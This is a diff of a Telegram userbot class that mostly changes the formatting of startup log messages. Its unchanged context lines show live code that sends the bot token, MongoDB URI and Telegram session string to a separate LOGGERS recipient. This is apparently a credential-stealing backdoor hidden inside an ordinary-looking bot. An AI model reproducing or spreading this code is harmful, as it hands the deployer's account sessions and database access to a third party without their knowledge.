@@ -80,7 +80,7 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "<blockquote>ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !</blockquote>")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
@@ -156,7 +156,7 @@ class Userbot(Client):
                 pass
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOGGER_ID, "<blockquote>ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !</blockquote>"")
+                await self.four.send_message(config.LOGGER_ID, "<blockquote>ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !</blockquote>")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
